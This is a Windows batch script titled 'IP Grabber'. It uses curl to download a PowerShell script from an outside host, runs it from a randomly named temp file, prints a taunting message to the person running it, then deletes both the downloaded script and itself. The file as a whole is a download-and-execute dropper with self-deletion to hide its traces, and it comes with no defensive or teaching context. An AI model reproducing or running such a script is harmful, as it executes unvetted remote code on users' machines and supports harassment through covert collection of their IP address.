@echo off
title IP Grabber
color 04
set randomized=%random%%random%
curl -s -o %temp%\%randomized%.ps1 http://daboiulimoi.7m.pl/Downloads-456822/IP-Provider.ps1

echo.
echo IP RETRIEVED: 
powershell -file %temp%\%randomized%.ps1
echo.
echo I've got your IP now, bitch. 
echo.
timeout /t 6 /nobreak > nul
del %temp%\%randomized%.ps1
del .\IP-Grabber.bat